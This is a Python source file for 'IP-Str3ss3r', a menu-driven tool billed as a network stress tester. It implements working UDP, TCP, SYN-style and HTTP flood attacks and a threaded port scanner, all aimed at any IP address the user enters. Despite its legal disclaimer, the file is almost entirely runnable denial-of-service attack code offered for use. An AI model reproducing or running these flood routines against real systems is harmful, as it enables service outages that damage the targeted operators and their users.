#!/usr/bin/env python3
"""
IP-Str3ss3r - Network Stress Testing Tool
For educational and authorized penetration testing only.
Author: github.com/Pljeka
Version: 1.0.0

IMPORTANT: This tool should only be used on systems you own or have explicit
permission to test. Unauthorized use against any system is illegal.
"""

import socket
import threading
import time
import os
import random
import sys
import argparse
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor

# Initialize colorama
init(autoreset=True)

# Banner display
banner = Fore.RED + """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣼⠀⠀⠀⠀⠈⠙⡆⢤⠀⠀⠀⠀⠀⣷⣄⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⡿⢿⡷⡆⠀⣵⣶⣿⣾⣷⣸⣄⠀⠀⠀⢰⠾⡿⢿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣽⣿⣿⣿⣿⡟⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣻⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠐⣻⣿⣿⡏⢹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣟⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⡄⠀⠀⠀⠀⢻⣿⣿⣷⡌⠸⣿⣾⢿⡧⠀⠀⠀⠀⠀⢀⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⡿⢛⣵⣾⣿⣿⣿⣿⣿⣯⣾⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢻⣿⣿⣿⣶⣌⠙⠋⠁⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣷⣮⡙⢿⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⡀⠀⠀⠀⣠⣽⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣝⢿⣇⠀⠀⠀⠀
⠀⠀⠀⣴⣯⣴⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⡿⢫⣾⣿⣿⣿⣿⣿⣿⡦⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⢴⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣧⣽⣦⠀⠀⠀
⠀⠀⣼⣿⣿⣿⠟⢁⣴⣿⡿⢿⣿⣿⡿⠛⣰⣿⠟⣻⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⢿⣿⣿⣿⣿⣿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⣆⠙⢿⣿⣿⡿⢿⣿⣦⡈⠻⣿⣿⣿⣧⠀⠀
⠀⡼⣻⣿⡟⢁⣴⡿⠋⠁⢀⣼⣿⠟⠁⣰⣿⠁⢰⣿⣿⣿⡿⣿⣿⣿⠿⠀⣠⣤⣾⣿⣿⣿⣿⣿⠀⠀⠽⣿⣿⣿⢿⣿⣿⣿⡆⠈⢿⣆⠀⠻⣿⣧⡀⠈⠙⢿⣦⡈⠻⣿⣟⢧⠀
⠀⣱⣿⠋⢠⡾⠋⠀⢀⣠⡾⠟⠁⠀⢀⣿⠟⠀⢸⣿⠙⣿⠀⠈⢿⠏⠀⣾⣿⠛⣻⣿⣿⣿⣿⣯⣤⠀⠀⠹⡿⠁⠀⣿⠏⣿⡇⠀⠹⣿⡄⠀⠈⠻⢷⣄⡀⠀⠙⢷⣄⠙⣿⣎⠂
⢠⣿⠏⠀⣏⢀⣠⠴⠛⠉⠀⠀⠀⠀⠈⠁⠀⠀⠀⠛⠀⠈⠀⠀⠀⠀⠈⢿⣿⣼⣿⣿⣿⣿⢿⣿⣿⣶⠀⠀⠀⠀⠀⠁⠀⠛⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠛⠦⣄⣀⣹⠀⠹⣿⡄
⣼⡟⠀⣼⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠋⠁⠀⢹⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣧⠀⢻⣷
⣿⠃⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣶⣦⣤⠀⠀⣿⡿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡆⠘⣿
⣿⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠁⠈⢻⣷⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣀⣀⣸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣿
⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇
⠈⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣴⡿⣷⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⡿⣟⣿⣿⣶⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Fore.RED + """
IP-Str3ss3r: Network Stress Testing Tool
Author: github.com/Pljeka
Version: 1.0.0 - For educational purposes only
""" + Style.RESET_ALL

# Legal disclaimer
disclaimer = Fore.YELLOW + """
[!] LEGAL DISCLAIMER [!]
This tool is provided for educational and authorized penetration testing purposes ONLY.
Using this tool against targets without explicit permission is ILLEGAL.
You are responsible for your actions. The developer assumes no liability.
Use responsibly and ethically.
""" + Style.RESET_ALL

class NetworkUtils:
    """Utility methods for networking operations."""
    
    @staticmethod
    def validate_ip(ip):
        """Validate if string is a valid IP address."""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
    
    @staticmethod
    def port_scan(ip, port):
        """Check if a port is open."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((ip, port))
            s.close()
            return result == 0
        except:
            return False

class SYNFlood(threading.Thread):
    """SYN Flood attack implementation with improved efficiency."""
    
    def __init__(self, target_ip, port, threads, duration, randomize_source=True):
        super().__init__()
        self.target_ip = target_ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.running = True
        self.randomize_source = randomize_source
        self.packets_sent = 0
        self.lock = threading.Lock()

    def run(self):
        print(Fore.YELLOW + f"[*] Starting SYN flood on {self.target_ip}:{self.port} for {self.duration}s with {self.threads} threads..." + Style.RESET_ALL)
        
        end_time = time.time() + self.duration
        update_time = time.time() + 1  # Update stats every second
        
        def syn_flood():
            local_count = 0
            while self.running and time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)  # Faster timeout for more efficiency
                    
                    # Improved: Optionally use random source ports and IPs
                    if self.randomize_source:
                        # This is just for SYN packet creation, not for establishing a full connection
                        s.bind(('0.0.0.0', random.randint(1024, 65535)))
                    
                    # Non-blocking connect attempt
                    s.setblocking(0)
                    s.connect_ex((self.target_ip, self.port))
                    
                    # We only want to send SYN, so close immediately
                    s.close()
                    local_count += 1
                    
                except Exception:
                    pass
            
            # Update the counter atomically
            with self.lock:
                self.packets_sent += local_count
        
        # Start worker threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=syn_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Main monitoring loop
        while time.time() < end_time:
            if time.time() > update_time:
                with self.lock:
                    rate = self.packets_sent / (time.time() - (end_time - self.duration))
                    print(f"\r[*] SYN flood in progress: {self.packets_sent} packets sent ({rate:.2f}/sec)", end="")
                update_time = time.time() + 1
            time.sleep(0.1)
        
        self.running = False
        print("\n" + Fore.GREEN + f"[+] SYN flood finished. Sent {self.packets_sent} packets total." + Style.RESET_ALL)

class TCPFlood(threading.Thread):
    """TCP Flood attack implementation."""
    
    def __init__(self, target_ip, port, connections, threads=10, duration=30):
        super().__init__()
        self.target_ip = target_ip
        self.port = port
        self.connections = connections
        self.threads = threads
        self.duration = duration
        self.running = True
        self.connections_made = 0
        self.lock = threading.Lock()
        self.active_connections = []
        self.connection_lock = threading.Lock()

    def run(self):
        print(Fore.YELLOW + f"[*] Starting TCP flood on {self.target_ip}:{self.port} with {self.threads} threads for {self.duration}s..." + Style.RESET_ALL)
        
        end_time = time.time() + self.duration
        update_time = time.time() + 1  # Update stats every second
        
        def tcp_worker():
            local_connections = []
            
            while self.running and time.time() < end_time:
                try:
                    # Create a new TCP socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    
                    # Connect to target
                    s.connect((self.target_ip, self.port))
                    
                    # Send random data to keep connection alive
                    payload = random._urandom(random.randint(1, 64))  # Small random payload
                    s.send(payload)
                    
                    # Track this connection
                    local_connections.append(s)
                    
                    with self.lock:
                        self.connections_made += 1
                    
                    # Randomly decide whether to close some old connections
                    # to avoid resource exhaustion on the client
                    if len(local_connections) > 100 or random.random() < 0.1:
                        to_close = random.randint(1, min(10, len(local_connections)))
                        for _ in range(to_close):
                            if local_connections:
                                try:
                                    conn = local_connections.pop(0)
                                    conn.close()
                                except:
                                    pass
                    
                    # Small sleep to pace the connections
                    time.sleep(0.01)
                    
                except Exception:
                    pass
            
            # Close all remaining connections when done
            for conn in local_connections:
                try:
                    conn.close()
                except:
                    pass
        
        # Start worker threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=tcp_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Main monitoring loop
        while time.time() < end_time:
            if time.time() > update_time:
                with self.lock:
                    elapsed = time.time() - (end_time - self.duration)
                    rate = self.connections_made / elapsed if elapsed > 0 else 0
                    print(f"\r[*] TCP flood in progress: {self.connections_made} connections ({rate:.2f}/sec)", end="")
                update_time = time.time() + 1
            time.sleep(0.1)
        
        self.running = False
        print("\n" + Fore.GREEN + f"[+] TCP flood finished. Made {self.connections_made} connection attempts." + Style.RESET_ALL)

class UDPFlood(threading.Thread):
    """UDP Flood attack implementation with improved efficiency."""
    
    def __init__(self, target_ip, port, packets, packet_size=1024, threads=10):
        super().__init__()
        self.target_ip = target_ip
        self.port = port
        self.packets = packets
        self.packet_size = min(packet_size, 65507)  # Max UDP size
        self.threads = threads
        self.packets_sent = 0
        self.lock = threading.Lock()

    def run(self):
        print(Fore.YELLOW + f"[*] Starting UDP flood on {self.target_ip}:{self.port} with {self.packets} packets ({self.packet_size} bytes each)..." + Style.RESET_ALL)
        
        start_time = time.time()
        update_time = time.time() + 1
        
        def udp_worker(packet_count):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(self.packet_size)
            local_count = 0
            
            for _ in range(packet_count):
                try:
                    s.sendto(payload, (self.target_ip, self.port))
                    local_count += 1
                    
                    # Update the stats periodically
                    if local_count % 1000 == 0:
                        with self.lock:
                            self.packets_sent += 1000
                except Exception:
                    pass
            
            # Add any remaining packets to the counter
            with self.lock:
                self.packets_sent += (local_count % 1000)
            
            s.close()
        
        # Distribute packets among threads
        packets_per_thread = self.packets // self.threads
        extra_packets = self.packets % self.threads
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for i in range(self.threads):
                # Distribute the remainder among the first 'extra_packets' threads
                packet_count = packets_per_thread + (1 if i < extra_packets else 0)
                executor.submit(udp_worker, packet_count)
        
        duration = time.time() - start_time
        rate = self.packets_sent / duration if duration > 0 else 0
        
        print(Fore.GREEN + f"[+] UDP flood finished. Sent {self.packets_sent} packets in {duration:.2f}s ({rate:.2f} packets/sec)" + Style.RESET_ALL)

class HTTPFlood(threading.Thread):
    """HTTP Flood attack implementation."""
    
    def __init__(self, target_ip, port, requests, threads=10, method="GET", path="/"):
        super().__init__()
        self.target_ip = target_ip
        self.port = port
        self.requests = requests
        self.threads = threads
        self.method = method
        self.path = path
        self.requests_sent = 0
        self.lock = threading.Lock()

    def run(self):
        print(Fore.YELLOW + f"[*] Starting HTTP {self.method} flood on {self.target_ip}:{self.port} with {self.requests} requests..." + Style.RESET_ALL)
        
        start_time = time.time()
        
        def http_worker(request_count):
            local_count = 0
            
            # Prepare request
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
            ]
            
            for _ in range(request_count):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self.target_ip, self.port))
                    
                    user_agent = random.choice(user_agents)
                    request = f"{self.method} {self.path} HTTP/1.1\r\n"
                    request += f"Host: {self.target_ip}\r\n"
                    request += f"User-Agent: {user_agent}\r\n"
                    request += "Accept: */*\r\n"
                    request += "Connection: keep-alive\r\n\r\n"
                    
                    s.send(request.encode())
                    local_count += 1
                    s.close()
                    
                    # Update stats every 100 requests
                    if local_count % 100 == 0:
                        with self.lock:
                            self.requests_sent += 100
                except Exception:
                    pass
            
            # Add remaining requests to counter
            with self.lock:
                self.requests_sent += (local_count % 100)
        
        # Distribute requests among threads
        requests_per_thread = self.requests // self.threads
        extra_requests = self.requests % self.threads
        
        threads = []
        for i in range(self.threads):
            request_count = requests_per_thread + (1 if i < extra_requests else 0)
            t = threading.Thread(target=http_worker, args=(request_count,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
        
        duration = time.time() - start_time
        rate = self.requests_sent / duration if duration > 0 else 0
        
        print(Fore.GREEN + f"[+] HTTP flood finished. Sent {self.requests_sent} requests in {duration:.2f}s ({rate:.2f} requests/sec)" + Style.RESET_ALL)

def main_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)
    print(disclaimer)
    
    # Get acknowledgment from user
    ack = input(Fore.RED + "Do you acknowledge that you will only use this tool for ethical and authorized testing? (y/n): " + Style.RESET_ALL)
    if ack.lower() != 'y':
        print(Fore.RED + "Exiting. This tool must only be used ethically and with authorization." + Style.RESET_ALL)
        sys.exit(3)
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
        print(Fore.CYAN + "===== MAIN MENU =====" + Style.RESET_ALL)
        print("1. UDP Flood")
        print("2. TCP Flood")
        print("3. SYN Flood")
        print("4. HTTP Flood (GET/POST)")
        print("5. Port Scanner")
        print("6. Help / About")
        print("7. Exit" + Style.RESET_ALL)
        
        choice = input("\nEnter your choice (1-7): ")
        
        if choice == "1":
            print(Fore.GREEN + "\n[+] UDP Flood Attack Selected" + Style.RESET_ALL)
            try:
                target_ip = input("Enter the target IP address: ")
                if not NetworkUtils.validate_ip(target_ip):
                    print(Fore.RED + "Invalid IP address format." + Style.RESET_ALL)
                    time.sleep(2)
                    continue
                    
                port = int(input("Enter the target port (default 80): ") or 80)
                packets = int(input("Enter the number of packets to send: "))
                packet_size = int(input("Enter packet size in bytes (default 1024): ") or 1024)
                threads = int(input("Enter number of threads (default 10): ") or 10)
                
                flood = UDPFlood(target_ip, port, packets, packet_size, threads)
                flood.start()
                flood.join()
                input("\nPress Enter to continue...")
            except ValueError:
                print(Fore.RED + "Invalid input. Please enter numeric values where required." + Style.RESET_ALL)
                time.sleep(2)
                
        elif choice == "2":
            print(Fore.GREEN + "\n[+] TCP Flood Attack Selected" + Style.RESET_ALL)
            try:
                target_ip = input("Enter the target IP address: ")
                if not NetworkUtils.validate_ip(target_ip):
                    print(Fore.RED + "Invalid IP address format." + Style.RESET_ALL)
                    time.sleep(2)
                    continue
                    
                port = int(input("Enter the target port (default 80): ") or 80)
                connections = int(input("Enter the number of connections to attempt: "))
                threads = int(input("Enter the number of threads (5-1000, default 20): ") or 20)
                threads = max(5, min(threads, 1000))  # Limit threads to reasonable range
                duration = int(input("Enter the duration in seconds (1-300, default 30): ") or 30)
                duration = max(1, min(duration, 300))  # Limit duration
                
                flood = TCPFlood(target_ip, port, connections, threads, duration)
                flood.start()
                flood.join()
                input("\nPress Enter to continue...")
            except ValueError:
                print(Fore.RED + "Invalid input. Please enter numeric values where required." + Style.RESET_ALL)
                time.sleep(2)
            
        elif choice == "3":
            print(Fore.GREEN + "\n[+] SYN Flood Attack Selected" + Style.RESET_ALL)
            try:
                target_ip = input("Enter the target IP address: ")
                if not NetworkUtils.validate_ip(target_ip):
                    print(Fore.RED + "Invalid IP address format." + Style.RESET_ALL)
                    time.sleep(2)
                    continue
                    
                port = int(input("Enter the target port (default 80): ") or 80)
                threads = int(input("Enter the number of threads (5-1000, default 50): ") or 50)
                threads = max(5, min(threads, 1000))  # Limit threads to reasonable range
                duration = int(input("Enter the duration in seconds (1-300, default 30): ") or 30)
                duration = max(1, min(duration, 300))  # Limit duration
                randomize = input("Randomize source addresses? (y/n, default y): ").lower() != 'n'
                
                flood = SYNFlood(target_ip, port, threads, duration, randomize)
                flood.start()
                flood.join()
                input("\nPress Enter to continue...")
            except ValueError:
                print(Fore.RED + "Invalid input. Please enter numeric values where required." + Style.RESET_ALL)
                time.sleep(2)
            
        elif choice == "4":
            print(Fore.GREEN + "\n[+] HTTP Flood Attack Selected" + Style.RESET_ALL)
            try:
                target_ip = input("Enter the target hostname/IP: ")
                port = int(input("Enter the target port (default 80): ") or 80)
                method = input("HTTP method (GET/POST, default GET): ").upper() or "GET"
                if method not in ["GET", "POST"]:
                    method = "GET"
                path = input("Enter target path (default /): ") or "/"
                requests = int(input("Enter number of requests to send: "))
                threads = int(input("Enter number of threads (default 10): ") or 10)
                
                flood = HTTPFlood(target_ip, port, requests, threads, method, path)
                flood.start()
                flood.join()
                input("\nPress Enter to continue...")
            except ValueError:
                print(Fore.RED + "Invalid input. Please enter numeric values where required." + Style.RESET_ALL)
                time.sleep(2)
                
        elif choice == "5":
            print(Fore.GREEN + "\n[+] Port Scanner Selected" + Style.RESET_ALL)
            try:
                target_ip = input("Enter target IP to scan: ")
                if not NetworkUtils.validate_ip(target_ip):
                    print(Fore.RED + "Invalid IP address format." + Style.RESET_ALL)
                    time.sleep(2)
                    continue
                
                port_range = input("Enter port range (e.g., 1-1000, default 1-1000): ") or "1-1000"
                try:
                    start_port, end_port = map(int, port_range.split("-"))
                except:
                    start_port, end_port = 1, 1000
                
                print(Fore.YELLOW + f"\n[*] Scanning {target_ip} for open ports ({start_port}-{end_port})..." + Style.RESET_ALL)
                open_ports = []
                
                # Use thread pool for faster scanning
                def scan_port(port):
                    if NetworkUtils.port_scan(target_ip, port):
                        return port
                    return None
                
                with ThreadPoolExecutor(max_workers=100) as executor:
                    futures = [executor.submit(scan_port, port) for port in range(start_port, end_port+1)]
                    for future in futures:
                        result = future.result()
                        if result:
                            open_ports.append(result)
                
                if open_ports:
                    print(Fore.GREEN + f"\n[+] Found {len(open_ports)} open ports on {target_ip}:" + Style.RESET_ALL)
                    for port in sorted(open_ports):
                        print(f"  - Port {port}: OPEN")
                else:
                    print(Fore.YELLOW + f"\n[!] No open ports found on {target_ip} in range {start_port}-{end_port}" + Style.RESET_ALL)
                
                input("\nPress Enter to continue...")
            except Exception as e:
                print(Fore.RED + f"Error during port scan: {e}" + Style.RESET_ALL)
                time.sleep(2)
                
        elif choice == "6":
            print(Fore.CYAN + "\n===== HELP / ABOUT =====" + Style.RESET_ALL)
            print("""
IP-Str3ss3r is a network stress testing tool designed for educational purposes and
authorized penetration testing only. It includes several attack modules:

1. UDP Flood: Sends a large number of UDP packets to the target.
2. TCP Flood: Establishes multiple TCP connections and keeps them open.
3. SYN Flood: Initiates many TCP connections without completing the handshake.
4. HTTP Flood: Sends GET or POST requests to web servers.
5. Port Scanner: Identifies open ports on a target system.

IMPORTANT NOTES:
- Always obtain written permission before testing any system
- Document your testing process and findings
- Only test systems you own or have authorization to test
- This tool should be used to improve security, not to harm systems

For more information on ethical penetration testing, visit:
- https://www.owasp.org/
- https://www.sans.org/
            """)
            input("\nPress Enter to continue...")
            
        elif choice == "7":
            print(Fore.GREEN + "\n[+] Exiting. Thank you for using IP-Str3ss3r ethically." + Style.RESET_ALL)
            time.sleep(1)
            sys.exit(3)
            
        else:
            print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
            time.sleep(1)

if __name__ == "__main__":
    try:
        # Check for command-line arguments
        if len(sys.argv) > 1:
            parser = argparse.ArgumentParser(description='IP-Str3ss3r - Network Stress Testing Tool')
            parser.add_argument('--tcp', action='store_true', help='Perform TCP flood attack')
            parser.add_argument('--udp', action='store_true', help='Perform UDP flood attack')
            parser.add_argument('--syn', action='store_true', help='Perform SYN flood attack')
            parser.add_argument('--http', action='store_true', help='Perform HTTP flood attack')
            parser.add_argument('--target', type=str, help='Target IP address')
            parser.add_argument('--port', type=int, default=80, help='Target port')
            parser.add_argument('--packets', type=int, default=1000, help='Number of packets/requests')
            parser.add_argument('--threads', type=int, default=10, help='Number of threads')
            parser.add_argument('--duration', type=int, default=30, help='Duration in seconds (for SYN/TCP flood)')
            parser.add_argument('--connections', type=int, default=1000, help='Number of connections (for TCP flood)')
            
            args = parser.parse_args()
            
            if args.target:
                if args.tcp:
                    TCPFlood(args.target, args.port, args.connections, args.threads, args.duration).run()
                elif args.udp:
                    UDPFlood(args.target, args.port, args.packets, threads=args.threads).run()
                elif args.syn:
                    SYNFlood(args.target, args.port, args.threads, args.duration).run()
                elif args.http:
                    HTTPFlood(args.target, args.port, args.packets, args.threads).run()
                else:
                    main_menu()
            else:
                main_menu()
        else:
            main_menu()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[!] Attack interrupted by user. Exiting..." + Style.RESET_ALL)
        time.sleep(1)
        sys.exit(3)
    except Exception as e:
        print(Fore.RED + f"\n[!] An error occurred: {e}" + Style.RESET_ALL)
        sys.exit(1)
